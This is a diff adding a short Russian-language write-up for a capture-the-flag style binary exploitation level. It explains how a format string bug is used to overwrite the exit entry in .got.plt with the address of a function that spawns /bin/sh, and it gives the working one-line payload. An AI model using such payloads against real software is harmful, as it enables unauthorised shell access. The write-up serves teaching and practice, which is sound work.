@@ -1,0 +1,31 @@
+# Level 5 - format string + .got.plt
+
+### Также как и в предыдущем задании, для вызова шелла требуется проэксплуатировать уязвимость форматной строки.
+
+### 1. Реверсим бинарный файл и обнаруживаем функцию **o()**, вызывающую шелл
+
+```c
+void o()
+{
+  system("/bin/sh");
+  _exit(1);
+}
+```
+
+### 2. Заменяем адрес **exit** в сегменте **.got.plt** на адрес функции **o()** с помощью той же техники, что и в предыдущих 2-х заданиях
+
+```c
+
+        ...
+.got.plt:08049824 off_8049824     dd offset printf        ; DATA XREF: _printf↑r
+.got.plt:08049828 off_8049828     dd offset _exit         ; DATA XREF: __exit↑r
+.got.plt:0804982C off_804982C     dd offset fgets         ; DATA XREF: _fgets↑r
+.got.plt:08049830 off_8049830     dd offset system        ; DATA XREF: _system↑r
+.got.plt:08049834 off_8049834     dd offset __gmon_start__
+        ...
+.got.plt:08049838 off_8049838     dd offset exit          ; DATA XREF: _exit↑r
+        ...
+```
+
+### 3. Формируем пейлоад: потребуется адрес функции **exit()** и **o()**
+    (echo -e '%134513828x%8$nA8\x98\x04\x08'; cat) | ./level5
